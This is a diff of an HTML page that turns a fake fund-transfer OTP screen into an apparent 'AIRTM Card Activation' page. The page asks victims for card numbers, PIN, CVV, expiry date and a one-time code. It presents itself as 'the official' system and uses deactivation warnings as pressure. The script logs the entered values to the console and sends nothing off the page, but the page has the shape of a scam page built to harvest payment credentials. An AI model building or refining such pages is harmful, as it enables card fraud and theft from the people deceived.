@@ -3,82 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Fund Transfer</title>
+    <title>AIRTM Card Activation</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f2f2f2;
+            background-color: #f7f7f7;
         }
         .container {
             width: 90%;
-            max-width: 400px;
+            max-width: 450px;
             padding: 20px;
             background-color: #fff;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
             text-align: center;
         }
         h2 {
             margin-top: 0;
             color: #333;
+            font-size: 24px;
         }
         p {
-            color: #666;
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 20px;
         }
-        input[type="text"] {
+        .important {
+            color: #d9534f;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        input[type="text"], input[type="password"], input[type="month"] {
             width: 100%;
-            padding: 10px;
-            margin: 15px 0;
+            padding: 12px;
+            margin: 10px 0;
             border: 1px solid #ccc;
             border-radius: 4px;
             font-size: 16px;
+            background-color: #fafafa;
         }
         button {
             width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
+            padding: 12px;
+            background-color: #28a745;
             border: none;
             border-radius: 4px;
             color: white;
             font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 20px;
+            transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #45a049;
+            background-color: #218838;
+        }
+        .notice {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-left: 5px solid #28a745;
+            margin-top: 20px;
+        }
+        .footer {
+            font-size: 14px;
+            color: #888;
+            margin-top: 30px;
         }
     </style>
 </head>
 <body>
 
-<div class="container" id="otpContainer">
-    <!-- OTP Input Form -->
-    <div id="otpForm">
-        <h2>Verify Fund Transfer</h2>
-        <p>To complete the transfer of <strong>R19,597</strong> with a transaction fee of <strong>R369.00</strong>, please enter the OTP sent to your mobile.</p>
-        <input type="text" id="otpInput" placeholder="Enter OTP" required>
-        <button onclick="validateOTP()">Validate OTP</button>
+<div class="container" id="cardInfoContainer">
+    <!-- First Screen: Card Number and PIN Input Form -->
+    <div id="firstScreen">
+        <h2>AIRTM Card Activation System</h2>
+        <p>Please enter your 9-digit card number, 32-digit card number, and your 5-digit PIN to begin the activation process.</p>
+        <input type="text" id="card9DigitNumberInput" placeholder="Enter 9-Digit Card Number" required>
+        <input type="text" id="card32DigitNumberInput" placeholder="Enter 32-Digit Card Number" required>
+        <input type="password" id="cardPinInput" placeholder="Enter 5-Digit PIN" required>
+        <button onclick="goToSecondScreen()">Submit</button>
+        <div class="footer">Note: This is the official AIRTM Card Activation System.</div>
     </div>
 
-    <!-- Transfer Approval Message -->
-    <div id="transferApprovalMessage" style="display: none;">
-        <h2>Fund Transfer Approved</h2>
-        <p>Your fund transfer of <strong>R19,597</strong> with a transaction fee of <strong>R369.00</strong> has been approved to the card ending in <strong>48903</strong>.</p>
-        <h2>Temporary ATM Card PIN</h2>
-        <p>Kindly await you card temporary pins with instructions to follow to complete your withdrawals <strong>16/11/2024</strong> at (17:13pm).</p>
+    <!-- Second Screen: Card Details Input Form -->
+    <div id="secondScreen" style="display: none;">
+        <h2>AIRTM Card Activation</h2>
+        <p>Please enter the following card details to continue with the activation process:</p>
+        <input type="text" id="cardNumberInput" placeholder="Enter Card Number (16 digits)" required>
+        <input type="month" id="expiryDateInput" placeholder="Enter Expiry Date (MM/YYYY)" required>
+        <input type="text" id="cvvInput" placeholder="Enter CVV (3 digits)" required>
+        <input type="password" id="cardPinInput2" placeholder="Re-enter Card PIN (5 digits)" required>
+        <button onclick="goToOtpScreen()">Submit</button>
+        <div class="notice">
+            <p class="important">Note: Incorrect details will result in your card remaining inactive for security reasons. Please ensure all details are accurate.</p>
+        </div>
+    </div>
+
+    <!-- Third Screen: OTP Input Form -->
+    <div id="otpForm" style="display: none;">
+        <h2>AIRTM Card Activation</h2>
+        <p>Your card details have been successfully registered. Please enter the OTP sent to your mobile to complete the activation.</p>
+        <input type="text" id="otpInput" placeholder="Enter OTP (5 digits)" required>
+        <button onclick="activateCard()">Activate Card</button>
+        <div class="footer">Note: This is the official AIRTM Card Activation System.</div>
+    </div>
+
+    <!-- Activation Success Message -->
+    <div id="activationSuccessMessage" style="display: none;">
+        <h2>Card Activated Successfully!</h2>
+        <p>Your card has been successfully activated. It will be available for use after receiving the confirmation SMS within 12-24 hours.</p>
+        <div class="notice">
+            <p class="important">For security reasons, entering an incorrect PIN will immediately deactivate the card, and the funds will be returned to the original source.</p>
+            <p>Your PIN is valid for only 4 attempts. After 4 incorrect attempts, the card will be permanently deactivated and nullified. Please enter the correct PIN to avoid deactivation.</p>
+        </div>
+        <div class="footer">Note: This is the official AIRTM Card Activation System.</div>
     </div>
 </div>
 
 <script>
-    function validateOTP() {
-        // Simulate OTP validation and show the transfer approval message
+    function goToSecondScreen() {
+        const card9DigitNumber = document.getElementById("card9DigitNumberInput").value;
+        const card32DigitNumber = document.getElementById("card32DigitNumberInput").value;
+        const cardPin = document.getElementById("cardPinInput").value;
+
+        // Validate 9-digit card number length
+        if (card9DigitNumber.length !== 9) {
+            alert("Invalid Card Number! The card number must be exactly 9 digits.");
+            return;
+        }
+
+        // Validate 32-digit card number length
+        if (card32DigitNumber.length !== 32) {
+            alert("Invalid Card Number! The card number must be exactly 32 digits.");
+            return;
+        }
+
+        // Validate PIN length
+        if (cardPin.length !== 5) {
+            alert("Invalid PIN! The PIN must be exactly 5 digits.");
+            return;
+        }
+
+        // If valid, proceed to second screen
+        document.getElementById("firstScreen").style.display = "none";
+        document.getElementById("secondScreen").style.display = "block";
+
+        console.log(`9-Digit Card Number: ${card9DigitNumber} with 32-Digit Card Number: ${card32DigitNumber} and PIN: ${cardPin} registered in AIRTM system.`);
+    }
+
+    function goToOtpScreen() {
+        const cardNumber = document.getElementById("cardNumberInput").value;
+        const expiryDate = document.getElementById("expiryDateInput").value;
+        const cvv = document.getElementById("cvvInput").value;
+        const cardPin2 = document.getElementById("cardPinInput2").value;
+
+        // Validate 16-digit card number length
+        if (cardNumber.length !== 16) {
+            alert("Invalid Card Number! The card number must be exactly 16 digits.");
+            return;
+        }
+
+        // Validate CVV length
+        if (cvv.length !== 3) {
+            alert("Invalid CVV! The CVV must be exactly 3 digits.");
+            return;
+        }
+
+        // Validate expiry date format
+        if (!expiryDate) {
+            alert("Invalid Expiry Date! Please enter a valid month and year (MM/YYYY).");
+            return;
+        }
+
+        // Validate PIN re-entry
+        if (cardPin2.length !== 5) {
+            alert("Invalid PIN! The PIN must be exactly 5 digits.");
+            return;
+        }
+
+        // If all fields are valid, proceed to OTP screen
+        document.getElementById("secondScreen").style.display = "none";
+        document.getElementById("otpForm").style.display = "block";
+    }
+
+    function activateCard() {
+        const otp = document.getElementById("otpInput").value;
+
+        // Validate OTP length (5 digits)
+        if (otp.length !== 5) {
+            alert("Invalid OTP! The OTP must be exactly 5 digits.");
+            return;
+        }
+
+        // If OTP is valid, show activation success message
         document.getElementById("otpForm").style.display = "none";
-        document.getElementById("transferApprovalMessage").style.display = "block";
+        document.getElementById("activationSuccessMessage").style.display = "block";
+        console.log(`OTP: ${otp} validated. Card activated.`);
     }
 </script>
 
